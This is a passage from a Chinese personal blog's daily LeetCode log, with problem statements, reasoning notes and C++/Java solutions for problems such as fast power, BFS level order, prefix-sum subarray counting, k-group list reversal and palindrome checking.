class="keyword">if</span>(left1==<span class="literal">NULL</span> &amp;&amp; right1 == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(left1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> right1;</span><br><span class="line">        <span class="keyword">if</span>(right1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> left1;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2020-05-11"><a href="#2020-05-11" class="headerlink" title="2020.05.11"></a>2020.05.11</h3><h4 id="50-Pow-x-n"><a href="#50-Pow-x-n" class="headerlink" title="50. Pow(x, n)"></a><a class="link"   href="https://leetcode-cn.com/problems/powx-n/" >50. Pow(x, n)<i class="fas fa-external-link-alt"></i></a></h4><p>实现 pow(x, n) ，即计算 x 的 n 次幂函数。</p>
<p>示例 1:</p>
<p>输入: 2.00000, 10<br>输出: 1024.00000<br>示例 2:</p>
<p>输入: 2.10000, 3<br>输出: 9.26100<br>示例 3:</p>
<p>输入: 2.00000, -2<br>输出: 0.25000<br>解释: 2-2 &#x3D; 1&#x2F;22 &#x3D; 1&#x2F;4 &#x3D; 0.25<br>说明:</p>
<p>-100.0 &lt; x &lt; 100.0<br>n 是 32 位有符号整数，其数值范围是 [−231, 231 − 1] 。</p>
<hr>
<p>这道题目 核心就是快速幂</p>
<p>相当于从5的56次方——我们求5的28次方——求5的14次方——求5的7次方——求5的3次方——求5的1次方——求5的0次方。</p>
<p>只需要7次就可以得到值。</p>
<p>但是注意到，在我们除二的时候，需要判断此时的幂是否为偶数。、</p>
<p>那么直接代码出来看看</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">myPow</span><span class="params">(<span class="type">double</span> x, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">solve</span>(x,(<span class="type">long</span> <span class="type">long</span>)n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 到了int最小值 我们要求-1*原值 那会越界溢出   所以需要提高空间 </span></span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">solve</span><span class="params">(<span class="type">double</span> x,<span class="type">long</span> <span class="type">long</span> n)</span></span>&#123;</span><br><span class="line">        <span class="comment">//递归到头返回</span></span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//此处确保稳定的正值</span></span><br><span class="line">        <span class="type">bool</span> right = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            right = <span class="literal">false</span>;</span><br><span class="line">            n=<span class="number">-1</span>*n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//得到返回值  递归的次数就是递归深度</span></span><br><span class="line">        <span class="type">double</span> temp = <span class="built_in">solve</span>(x,n/<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//根据偶数与否确定是否要乘x</span></span><br><span class="line">        <span class="type">double</span> res = n%<span class="number">2</span>==<span class="number">0</span>?temp*temp:temp*temp*x;</span><br><span class="line">        <span class="comment">//最终结果</span></span><br><span class="line">        <span class="keyword">if</span>(right)</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1.0</span>/res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2020-05-13"><a href="#2020-05-13" class="headerlink" title="2020.05.13"></a>2020.05.13</h3><h4 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102. 二叉树的层序遍历"></a><a class="link"   href="https://leetcode-cn.com/problems/binary-tree-level-order-traversal/" >102. 二叉树的层序遍历<i class="fas fa-external-link-alt"></i></a></h4><p>给你一个二叉树，请你返回其按 层序遍历 得到的节点值。 （即逐层地，从左到右访问所有节点）。</p>
<p>示例：<br>二叉树：[3,9,20,null,null,15,7],</p>
<p>​	3</p>
<p>   &#x2F; <br>  9  20<br>    &#x2F;  <br>   15   7<br>返回其层次遍历结果：</p>
<p>[<br>  [3],<br>  [9,20],<br>  [15,7]<br>]</p>
<hr>
<p>解析——标准地BFS遍历</p>
<p>常见地BFS一般是使用队列来实现</p>
<p>我觉得看代码就懂了！</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(TreeNode* root) &#123;</span><br><span class="line">        <span class="comment">//目标结果</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ves;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="comment">//特殊情况</span></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ves;</span><br><span class="line">        <span class="comment">//开始嵌入</span></span><br><span class="line">        que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="comment">//根源</span></span><br><span class="line">        <span class="keyword">while</span>(!que.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; cenves;</span><br><span class="line">            <span class="type">int</span> length = que.<span class="built_in">size</span>();</span><br><span class="line">            <span class="comment">//核心 注意for循环里一定是length 不能直接写que.size()</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">                TreeNode * node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                cenves.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">                <span class="comment">//从左到右</span></span><br><span class="line">                <span class="keyword">if</span>(node-&gt;left!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node-&gt;right!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ves.<span class="built_in">push_back</span>(cenves);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ves;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2020-05-14"><a href="#2020-05-14" class="headerlink" title="2020.05.14"></a>2020.05.14</h3><h4 id="136-只出现一次的数字"><a href="#136-只出现一次的数字" class="headerlink" title="136. 只出现一次的数字"></a><a class="link"   href="https://leetcode-cn.com/problems/single-number/" >136. 只出现一次的数字<i class="fas fa-external-link-alt"></i></a></h4><p>给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</p>
<p>说明：</p>
<p>你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p>
<p>示例 1:</p>
<p>输入: [2,2,1]<br>输出: 1<br>示例 2:</p>
<p>输入: [4,1,2,1,2]<br>输出: 4</p>
<hr>
<p>很像是前面做过的那道题——数组中数字出现的次数</p>
<p>所以很容易想到异或</p>
<p>说明下异或的操作</p>
<p>任何数字和0异或都为原来的值</p>
<p>相同数字异或为0</p>
<p>那么直接可以写出代码了</p>
<p>【再想想还有什么方法：利用map也可以不过需要空间还要时间。</p>
<p>代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">singleNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//遍历</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            res=res^nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>时间复杂度：遍历了一遍数组 故而 O(n)</p>
<p>空间复杂度：没有额外的空间 故而O(1)</p>
<h3 id="2020-05-15"><a href="#2020-05-15" class="headerlink" title="2020.05.15"></a>2020.05.15</h3><h4 id="560-和为K的子数组"><a href="#560-和为K的子数组" class="headerlink" title="560. 和为K的子数组"></a><a class="link"   href="https://leetcode-cn.com/problems/subarray-sum-equals-k/" >560. 和为K的子数组<i class="fas fa-external-link-alt"></i></a></h4><p>给定一个整数数组和一个整数 k，你需要找到该数组中和为 k 的连续的子数组的个数。</p>
<p>示例 1 :</p>
<p>输入:nums &#x3D; [1,1,1], k &#x3D; 2<br>输出: 2 , [1,1] 与 [1,1] 为两种不同的情况。<br>说明 :</p>
<p>数组的长度为 [1, 20,000]。<br>数组中元素的范围是 [-1000, 1000] ，且整数 k 的范围是 [-1e7, 1e7]。</p>
<hr>
<p>这道题目是有正数有负数。</p>
<p>本来我一开始想的是利用前缀和+尺取法搞定</p>
<p>想一想 一开始觉得很对结果…</p>
<p>nums  &#x3D;   1	1	1	-1	2	这里的k&#x3D;2</p>
<p>如果按照尺取法，那么在nums[2]的时候 大于2，这个时候<code>l</code>就要加一</p>
<p>那么就不会出现 我们的数组为<code>[1	1	1	-1]  = 2</code>这种情况啦</p>
<p>所以尺取法行不通。看了下 尺取法一般用来解决具有单调性的区间问题</p>
<p>下面说说正规的方法：</p>
<h5 id="暴力"><a href="#暴力" class="headerlink" title="暴力"></a>暴力</h5><p><code>i	j</code>嘛。我们直接循环查找。</p>
<p>首先最外层i循环 内部 j循环 如果&#x3D;&#x3D;k，那么就count++</p>
<p>那么代码就有了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">subarraySum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        从 i 出发   载到j</span></span><br><span class="line"><span class="comment">        如果i-j只和为k 则 count++</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">int</span> size = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="type">int</span> sum =<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;size;j++)&#123;</span><br><span class="line">                sum += nums[j];</span><br><span class="line">                <span class="keyword">if</span>(sum == k)&#123;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这样极度容易超时。</p>
<p>反省了一下，以后用<code>int size = nums.size()</code></p>
<p>这样可以节省时间，更加有效。</p>
<h5 id="前缀和-哈希表优化"><a href="#前缀和-哈希表优化" class="headerlink" title="前缀和+哈希表优化"></a>前缀和+哈希表优化</h5><p>这个的思路是什么呢？</p>
<p>​    <em>利用前缀和+map</em></p>
<p>​    <em>前缀和在遍历的时候+</em></p>
<p>​    <em>因为 sum[j] - sum[i-1] &#x3D;&#x3D; k 说明 j-i满足和为k的数组</em></p>
<p>​    <em>那么在遍历前缀和的时候， 如果 sum[j] - k 存在这个数字</em></p>
<p>​    <em>那么我们加上这个数字出现的次数 在这个区间内 有</em></p>
<p>​    <em>但是记住 我们是统计 在j这个之前的是否存在 sum[j]-k！</em> </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">subarraySum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        利用前缀和+map</span></span><br><span class="line"><span class="comment">        前缀和在遍历的时候+</span></span><br><span class="line"><span class="comment">        因为 sum[j] - sum[i-1] == k 说明 j-i满足和为k的数组</span></span><br><span class="line"><span class="comment">        那么在遍历前缀和的时候， 如果 sum[j] - k 存在这个数字</span></span><br><span class="line"><span class="comment">        那么我们加上这个数字出现的次数 在这个区间内 有</span></span><br><span class="line"><span class="comment">        但是记住 我们是统计 在j这个之前的是否存在 sum[j]-k！ </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; mp;  <span class="comment">//我们的map</span></span><br><span class="line">        mp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> pre = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i:nums)&#123;</span><br><span class="line">            pre += i;<span class="comment">//统计前缀和</span></span><br><span class="line">            <span class="keyword">if</span>(mp.<span class="built_in">count</span>(pre - k))&#123;</span><br><span class="line">                <span class="comment">//加上 在此之前的</span></span><br><span class="line">                count += mp[(pre-k)];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 记录下这个数字出现次数</span></span><br><span class="line">            mp[pre]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>我打算之后写写Java的题解，相当于练习java了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">subarraySum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//HashMap 调出来</span></span><br><span class="line">        HashMap&lt;Integer,Integer&gt; mp = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        mp.put(<span class="number">0</span>,<span class="number">1</span>);<span class="comment">//put方法放进去</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i:nums)&#123;</span><br><span class="line">            pre+=i;</span><br><span class="line">            <span class="comment">//确定是否包含</span></span><br><span class="line">            <span class="keyword">if</span>(mp.containsKey(pre - k))&#123;</span><br><span class="line">                count+=mp.get(pre - k);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//getOrDefault 拿值或者默认值  这里是Integer</span></span><br><span class="line">            mp.put(pre,mp.getOrDefault(pre, <span class="number">0</span>)+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2020-05-16"><a href="#2020-05-16" class="headerlink" title="2020.05.16"></a>2020.05.16</h3><h4 id="25-K-个一组翻转链表"><a href="#25-K-个一组翻转链表" class="headerlink" title="25. K 个一组翻转链表"></a><a class="link"   href="https://leetcode-cn.com/problems/reverse-nodes-in-k-group/" >25. K 个一组翻转链表<i class="fas fa-external-link-alt"></i></a></h4><p>给你一个链表，每 k 个节点一组进行翻转，请你返回翻转后的链表。</p>
<p>k 是一个正整数，它的值小于或等于链表的长度。</p>
<p>如果节点总数不是 k 的整数倍，那么请将最后剩余的节点保持原有顺序。</p>
<p>示例：</p>
<p>给你这个链表：1-&gt;2-&gt;3-&gt;4-&gt;5</p>
<p>当 k &#x3D; 2 时，应当返回: 2-&gt;1-&gt;4-&gt;3-&gt;5</p>
<p>当 k &#x3D; 3 时，应当返回: 3-&gt;2-&gt;1-&gt;4-&gt;5</p>
<p>说明：</p>
<p>你的算法只能使用常数的额外空间。<br>你不能只是单纯的改变节点内部的值，而是需要实际进行节点交换。</p>
<hr>
<p>首先 这题反转链表很简单，但是后面就好难好难</p>
<p>我觉得这道题目 题解解释的很清楚，但是记录下一些很好的东西。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/2020051722374978.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="在这里插入图片描述"
                ></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseKGroup</span><span class="params">(ListNode* head, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//把哨兵节点写出来</span></span><br><span class="line">        ListNode * bhead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        bhead-&gt;next = head;</span><br><span class="line">        ListNode * pre = bhead;</span><br><span class="line">        <span class="comment">//前期阶段 哨兵节点处理完毕 进入循环</span></span><br><span class="line">        <span class="keyword">while</span>(head)&#123;</span><br><span class="line">            ListNode * tail = pre;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;k;i++)&#123;</span><br><span class="line">                tail = tail-&gt;next;</span><br><span class="line">                <span class="keyword">if</span>(tail == <span class="literal">NULL</span>)</span><br><span class="line">                    <span class="keyword">return</span> bhead-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//得到K个一组的最后一个节点</span></span><br><span class="line">            <span class="comment">//记录写一个节点</span></span><br><span class="line">            ListNode * tail_nex = tail-&gt;next;</span><br><span class="line">            <span class="built_in">tie</span>(head,tail) = <span class="built_in">rev</span>(head,tail);</span><br><span class="line">            <span class="comment">//处理反转之后两个端点的节点指向</span></span><br><span class="line">            pre-&gt;next = head;</span><br><span class="line">            tail-&gt;next=tail_nex;</span><br><span class="line">            <span class="comment">//给后续的循环</span></span><br><span class="line">            head=tail_nex;</span><br><span class="line">            pre=tail;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bhead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">pair&lt;ListNode* ,ListNode* &gt; <span class="title">rev</span><span class="params">(ListNode* head,ListNode* tail)</span></span>&#123;</span><br><span class="line">        ListNode * pre = <span class="literal">NULL</span>;</span><br><span class="line">        ListNode* cul = head;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(pre != tail)&#123;</span><br><span class="line">            ListNode* temp = cul-&gt;next;           </span><br><span class="line">            cul-&gt;next = pre;</span><br><span class="line">            pre = cul;</span><br><span class="line">            cul = temp;</span><br><span class="line">            <span class="comment">//如果 前面 cul = value temp = NULL;</span></span><br><span class="line">            <span class="comment">//那么这里又有 NULL-&gt;next;  就会空指针异常</span></span><br><span class="line">            <span class="comment">//temp = temp-&gt;next;</span></span><br><span class="line">            <span class="comment">//考虑特殊情况指针异常 往最前面 最后面套进去看看</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;tail,head&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>说实话，我不知道怎么总结这道题目。。 就很无奈。【哎</p>
]]></content>
      <categories>
        <category>leetcode——每日一题</category>
      </categories>
  </entry>
  <entry>
    <title>leetcode_04</title>
    <url>/2020/05/18/Leetcode_%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/leetcode-04/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>21天打卡任务 开始了</p>
<span id="more"></span>

<h3 id="2020-05-18"><a href="#2020-05-18" class="headerlink" title="2020.05.18"></a>2020.05.18</h3><h4 id="152-乘积最大子数组"><a href="#152-乘积最大子数组" class="headerlink" title="152. 乘积最大子数组"></a><a class="link"   href="https://leetcode-cn.com/problems/maximum-product-subarray/" >152. 乘积最大子数组<i class="fas fa-external-link-alt"></i></a></h4><p>给你一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字），并返回该子数组所对应的乘积。</p>
<p>示例 1:</p>
<p>输入: [2,3,-2,4]<br>输出: 6<br>解释: 子数组 [2,3] 有最大乘积 6。<br>示例 2:</p>
<p>输入: [-2,0,-1]<br>输出: 0<br>解释: 结果不能为 2, 因为 [-2,-1] 不是子数组。</p>
<hr>
<h5 id="强势暴力破解"><a href="#强势暴力破解" class="headerlink" title="强势暴力破解"></a>强势暴力破解</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProduct</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> ans = <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> max_res = INT_MIN;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = i;j&lt;nums.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">                ans*=nums[j];</span><br><span class="line">                max_res = <span class="built_in">max</span>(ans,max_res);</span><br><span class="line">            &#125;</span><br><span class="line">            ans = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max_res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很不幸，超时了。。</p>
<h5 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h5><p>这个 需要求出动态规划方程</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200518181117832.PNG"
                      alt="img"
                ></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProduct</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> max_F = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> min_F = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> ans = max_F;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="comment">//需要提前记录下来 max_F,min_F</span></span><br><span class="line">            <span class="comment">//不然 在求解min_F的时候会出现 不同时更新的现象</span></span><br><span class="line">            <span class="type">int</span> F_max = max_F;</span><br><span class="line">            <span class="type">int</span> F_min = min_F;</span><br><span class="line">            <span class="comment">//这里 我们利用max_F 记录下每一个到此为止最大乘积</span></span><br><span class="line">            max_F = <span class="built_in">max</span>(<span class="built_in">max</span>(F_max*nums[i],F_min*nums[i]),nums[i]);</span><br><span class="line">            <span class="comment">//这里记录下一个到此为止乘积最小值</span></span><br><span class="line">            min_F = <span class="built_in">min</span>(<span class="built_in">min</span>(F_min*nums[i],F_max*nums[i]),nums[i]);</span><br><span class="line">            ans = <span class="built_in">max</span>(max_F,ans);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个题目时间复杂度极度好！！！</p>
<p>时间O(n)		空间O(1)</p>
<h3 id="2020-05-19"><a href="#2020-05-19" class="headerlink" title="2020.05.19"></a>2020.05.19</h3><h4 id="680-验证回文字符串-Ⅱ"><a href="#680-验证回文字符串-Ⅱ" class="headerlink" title="680. 验证回文字符串 Ⅱ"></a><a class="link"   href="https://leetcode-cn.com/problems/valid-palindrome-ii/" >680. 验证回文字符串 Ⅱ<i class="fas fa-external-link-alt"></i></a></h4><p>给定一个非空字符串 s，最多删除一个字符。判断是否能成为回文字符串。</p>
<p>示例 1:</p>
<p>输入: “aba”<br>输出: True<br>示例 2:</p>
<p>输入: “abca”<br>输出: True<br>解释: 你可以删除c字符。</p>
<hr>
<p>这道题目 其实考点容易的</p>
<p>回文串 那么双指针查找就好了</p>
<p>但是如何判断去除一个字符之后还是回文串呢？</p>
<p>我一开始的想法是</p>
<p>如果 i	j 两个指针的字符不一致，那么判断去除哪个字符</p>
<p>如何判断	 假设 i+1和 j字符相同  那么去除 i字符</p>
<p>假设 i 和 j+1字符相同	那么去除j字符</p>
<p>如果上述都不成立 直接返回false。</p>
<p>但是出现了一个很尴尬的情况</p>
<p><code>cuppucu</code>: 我们看的出来去除u字符，但是 按照判断逻辑</p>
<p>c+1 &#x3D; u字符和 j的u字符相等 所以应该去除c字符。</p>
<p>这个时候我就有点难受了。。。。</p>
<p>下面是正确思路：</p>
<p>去除一个字符后 剩下的就应该是回文串 如果不是 那么就直接返回false</p>
<p>代码很好写</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">validPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>, j = s.<span class="built_in">size</span>()<span class="number">-1</span>;i&lt;j;i++,j--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]!=s[j])&#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">bool</span> res1=<span class="literal">true</span>,res2=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> start = i+<span class="number">1</span>,end =j;start&lt;end;start++,end--)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(s[start]!=s[end])</span><br><span class="line">                        res1 = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> start = i,end =j<span class="number">-1</span>;start&lt;end;start++,end--)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(s[start]!=s[end])</span><br><span class="line">                        res2 = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(res1||res2)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

